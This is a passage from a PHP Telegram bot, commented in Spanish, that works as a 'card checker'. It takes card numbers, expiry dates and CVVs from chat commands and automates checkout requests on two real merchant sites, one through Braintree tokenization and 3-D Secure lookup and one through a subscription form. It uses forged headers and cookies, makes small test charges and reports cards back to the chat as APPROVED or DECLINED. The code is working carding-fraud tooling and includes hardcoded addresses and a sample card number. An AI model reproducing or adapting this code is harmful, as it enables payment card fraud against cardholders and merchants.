    'accept-language: es-US,es;q=0.6',
    'referer: https://www.partyrama.co.uk/themes/first-birthday-boy-party-supplies/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

$patron = '/woocommerce-process-checkout-nonce.*?value="([^"]+)"/';
preg_match($patron, $response, $coincidencia);
$nonce1 = $coincidencia[1];
//echo "($nonce1)\n"; // Salida: c74e67aa43

//d192b23a07


///EXTRAE LAS CONF//
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"822c80e1-9974-46e5-a9dd-0960c57582e4"},"query":"query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }","operationName":"ClientConfiguration"}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'authorization: Bearer '.$bear.'',
    'braintree-version: 2018-05-10',
    'origin: https://www.partyrama.co.uk',
    'referer: https://www.partyrama.co.uk/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true); // true convierte el JSON en un a>
curl_close($curl);

$cardinalAuthenticationJWT = $data['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT'];
$googleAuthorization = $data['data']['clientConfiguration']['googlePay']['googleAuthorization'];

$paypalClientId = $data['data']['clientConfiguration']['googlePay']['paypalClientId'];
$clientId = $data['data']['clientConfiguration']['paypal']['clientId'];
$braintreeClientId = $data['data']['clientConfiguration']['paypal']['braintreeClientId'];

//echo "$paypalClientId\n";

///EXTRAE EL TOKEN
$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
//  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"822c80e1-9974-46e5-a9dd-0960c57582e4"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5355842279773621","expirationMonth":"10","expirationYear":"2027","cvv":"588","billingAddress":{"postalCode":"NG17 7WS","streetAddress":"D M Tesseract"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"c60a9304-b8d6-4191-9cf4-cd2775f20ee3"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"EH6 4JL","streetAddress":"10/10 Hawthornvale"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'authorization: Bearer '.$bear.'',
    'braintree-version: 2018-05-10',
    'origin: https://assets.braintreegateway.com',
    'referer: https://assets.braintreegateway.com/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$bin = $json['data']['tokenizeCreditCard']['creditCard']['bin'];
$token = $json['data']['tokenizeCreditCard']['token'];

curl_close($curl);

//echo "Token: $token\n\n";

///EXTRAE EL NONCE
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.braintreegateway.com/merchants/h9rc962wyvrr97jn/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
//  CURLOPT_POSTFIELDS => '{"amount":"1.80","browserColorDepth":24,"browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"es-US","browserScreenHeight":851,"browserScreenWidth":393,"browserTimeZone":360,"deviceChannel":"Browser","additionalInfo":{"shippingGivenName":"","shippingSurname":"Olivia","ipAddress":"138.84.45.137","billingLine1":"D M Tesseract","billingLine2":"PO Box 10800, Kirkby-in-Ashfield","billingCity":"Nottingham","billingState":"","billingPostalCode":"NG17 7WS","billingCountryCode":"GB","billingPhoneNumber":"(416) 831-1335","billingGivenName":"","billingSurname":"Olivia","shippingLine1":"D M Tesseract","shippingLine2":"PO Box 10800, Kirkby-in-Ashfield","shippingCity":"Nottingham","shippingState":"","shippingPostalCode":"NG17 7WS","shippingCountryCode":"GB","email":"gopejob932@ndiety.com"},"bin":"535584","dfReferenceId":"0_0b7161ac-01fb-4cf2-9f98-3259a3c19589","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.106.0","cardinalDeviceDataCollectionTimeElapsed":7,"issuerDeviceDataCollectionTimeElapsed":10067,"issuerDeviceDataCollectionResult":false},"authorizationFingerprint":"'.$bear.'","braintreeLibraryVersion":"braintree/web/3.106.0","_meta":{"merchantAppId":"www.partyrama.co.uk","platform":"web","sdkVersion":"3.106.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"822c80e1-9974-46e5-a9dd-0960c57582e4"}}',
  CURLOPT_POSTFIELDS => '{"amount":"1.80","browserColorDepth":24,"browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"es-US","browserScreenHeight":851,"browserScreenWidth":393,"browserTimeZone":360,"deviceChannel":"Browser","additionalInfo":{"shippingGivenName":"","shippingSurname":"'.$name.'","ipAddress":"'.$ip.'","billingLine1":"10/10 Hawthornvale","billingLine2":"","billingCity":"Edinburgh","billingState":"","billingPostalCode":"EH6 4JL","billingCountryCode":"GB","billingPhoneNumber":"'.$phone.'","billingGivenName":"","billingSurname":"'.$name.'","shippingLine1":"10/10 Hawthornvale","shippingLine2":"","shippingCity":"Edinburgh","shippingState":"","shippingPostalCode":"EH6 4JL","shippingCountryCode":"GB","email":"'.$correo.'"},"bin":"'.$bin.'","dfReferenceId":"0_8c3eb650-aa83-4ade-853a-1a11de9ec092","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.106.0","cardinalDeviceDataCollectionTimeElapsed":588,"issuerDeviceDataCollectionTimeElapsed":10502,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$bear.'","braintreeLibraryVersion":"braintree/web/3.106.0","_meta":{"merchantAppId":"www.partyrama.co.uk","platform":"web","sdkVersion":"3.106.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"c60a9304-b8d6-4191-9cf4-cd2775f20ee3"}}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'origin: https://www.partyrama.co.uk',
    'referer: https://www.partyrama.co.uk/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$nonce = $json['paymentMethod']['nonce'];
//echo "nonce: $nonce\n\n";

curl_close($curl);


///Verifica la Targeta//
$cadena = 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.partyrama.co.uk%2F&wc_order_attribution_session_start_time=2024-09-08+03%3A55%3A13&wc_order_attribution_session_pages=5&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F128.0.0.0+Mobile+Safari%2F537.36&ship_to_different_address=1&shipping_last_name='.$name.'&shipping_phone='.$phone.'&shipping_country=GB&shipping_address_1=D+M+Tesseract&shipping_address_2=PO+Box+10800%2C+Kirkby-in-Ashfield&shipping_city=Nottingham&shipping_postcode=NG17+7WS&order_comments=&billing_last_name='.$name.'&billing_phone='.$phone.'&billing_country=GB&billing_address_1=D+M+Tesseract&billing_address_2=PO+Box+10800%2C+Kirkby-in-Ashfield&billing_city=Nottingham&billing_postcode=NG17+7WS&billing_email='.$correo.'&account_password=&shipping_method%5B0%5D=partyrama_shipping%3Arate%3A14&payment_method=braintree_cc&braintree_cc_nonce_key='.$nonce.'&braintree_cc_device_data=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fh9rc962wyvrr97jn%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fh9rc962wyvrr97jn%22%7D%2C%22merchantId%22%3A%22h9rc962wyvrr97jn%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22IE%22%2C%22currencyCode%22%3A%22GBP%22%2C%22merchantIdentifier%22%3A%22h9rc962wyvrr97jn%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22American+Express%22%2C%22Maestro%22%2C%22UK+Maestro%22%2C%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22".$cardinalAuthenticationJWT."%22%7D%2C%22androidPay%22%3A%7B%22displayName%22%3A%22Partyrama%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22".$googleAuthorization."%22%2C%22paypalClientId%22%3A%22".$paypalClientId."%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Partyrama%22%2C%22clientId%22%3A%22".$clientId."%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22".$braintreeClientId."%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22appartyramacouk%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22GBP%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=&braintree_googlepay_nonce_key=&braintree_googlepay_device_data=&braintree_applepay_nonce_key=&braintree_applepay_device_data=&woocommerce-process-checkout-nonce=36f3fa9339&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review';
$data = str_replace("36f3fa9339", $nonce1, $cadena);

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.partyrama.co.uk?wc-ajax=checkout',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => $data,
  CURLOPT_COOKIE => 'email-section=1; email-only='.$correo.'; email-section=1; delivery-instructions=; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-10%2004%3A54%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-10%2004%3A54%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; PHPSESSID=219e1f52d6422e534d2371ea41241d60; woocommerce_items_in_cart=1; wp_woocommerce_session_e8067bc7d3b30e6c6ba61052d27f1737=t_9ba71db98f8a23b83246b9a81f591d%7C%7C1726117014%7C%7C1726113414%7C%7C2b17f0d48a34b8bebab8126cfa97159f; __kla_id=eyJlbWFpbCI6InJpZ29qNzc3QGdtYWlsLmNvbSJ9; woocommerce_cart_hash=4958933f2dac9049a052d2576efb347b; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
//    'x-requested-with: XMLHttpRequest',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.partyrama.co.uk',
    'referer: https://www.partyrama.co.uk/checkout/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true);
$mensaje_error = trim(strip_tags($data['messages']));
//--------------------------------------------------
$patron = "/Reason: (.*)/";
preg_match($patron, $mensaje_error, $matches);
$respo = $matches[1];
//--------------------------------------------------
curl_close($curl);

if (empty($respo)) {
$respo = trim(strip_tags($data['messages']));

}


$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";

if (empty($respo)) {
        $respo = $response;
}
//echo "$respo\n";

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1.80)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your payment method was rejected due to 3D Secure.') !== false || strpos($respo, 'Declined - Call Issuer') !== false || strpos($respo, 'Pick up card - S') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1.80)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1.80)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}





////https://panoramitalia.com/index.php/subscribe/
elseif((strpos($message, "!pa") === 0)||(strpos($message, "/pa") === 0)||(strpos($message, ".pa") === 0)){



$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
	//$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$cvv   = $i[3];

$bin = substr($lista, 0, 6);


////
$num = "$cc$mes$ano$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /pa cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !pa cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .pa cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);
$binna = json_decode($content,true);
//---------------------------------------------//
$brand = $binna['scheme'];
if (empty($brand)) {
$brand = "Unavailable";
}
$MV = ucwords(strtolower(trim($brand)));


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://panoramitalia.com/index.php/subscribe/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fpanoramitalia.com%2F%3Fwc-ajax%3Dget_refreshed_fragments',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'Upgrade-Insecure-Requests: 1',
    'Accept-Language: es-US,es;q=0.6',
    'Referer: https://panoramitalia.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

$patron = '/name="_cf_verify" value="([^"]+)"/';
preg_match($patron, $response, $coincidencias);
$token = $coincidencias[1];



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://panoramitalia.com/cf-api/CF6317ae143565f',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => [
    '_cf_verify' => ''.$token.'',
    '_wp_http_referer' => '/index.php/subscribe/',
    '_cf_frm_id' => 'CF6317ae143565f',
    '_cf_frm_ct' => '1',
    'cfajax' => 'CF6317ae143565f',
    '_cf_cr_pst' => '335',
    'twitter' => '',
    'fld_1604923' => 'Canada',
    'fld_3782878' => '1 year ($20) - 4 issues',
    'fld_6223773' => 'First time subscription',
    'fld_3249557' => '1',
    'fld_7659764' => ''.$correo.'',
    'fld_5990741' => ''.$cc.'',
    'fld_1615852' => ''.$mes.' / '.$ano.'',
    'fld_4133199' => ''.$cvv.'',
    'fld_2356280' => ''.$MV.'',
    'fld_950613' => ''.$nombre.'',
    'fld_2278346' => ''.$apellido.'',
    'fld_6787259' => ''.$telefono.'',
    'fld_2041995' => 'Canada',
    'fld_5232305' => ''.$direccion1.'',
    'fld_4491871' => ''.$direccion1.'',
    'fld_3911000' => ''.$ciudad.'',
    'fld_2494407' => ''.$zip.'',
    'fld_778305' => 'AZ',
    'fld_4577367' => '20.00',
    'fld_3144093' => 'click',
    'fld_5757786' => ''.$fecha.'',
    'fld_2545505' => '101204525',
    'fld_6974264' => '100',
    'instance' => '1',
    'request' => 'https://panoramitalia.com/cf-api/CF6317ae143565f',
    'formId' => 'CF6317ae143565f',
    'postDisable' => '0',
    'target' => '#caldera_notices_1',
    'loadClass' => 'cf_processing',
    'loadElement' => '_parent',
    'hiderows' => 'true',
    'action' => 'cf_process_ajax_submit',
    'cfajax' => 'CF6317ae143565f',
    'template' => '#cfajax_CF6317ae143565f-tmpl',
  ],
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fpanoramitalia.com%2F%3Fwc-ajax%3Dget_refreshed_fragments',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
    'Origin: https://panoramitalia.com',
    'Referer: https://panoramitalia.com/index.php/subscribe/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true);
$respo = strip_tags($data['html']);
curl_close($curl);

////EXTRAE EL MENSAJE DE SUSCRPCION////
$partes = explode('.', $respo);
$respo = implode('.', array_slice($partes, 0, 2));
if (!preg_match('/\.$/', $respo)) {
    $respo .= '.';
}

$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";



$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";

if ($respo == 'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.'){
$respo = 'Card Issuer Declined CVV';
}

if (empty($respo)) {
        $respo = $response;
}

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($20)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Transaction refused due to risk model.') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($20)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
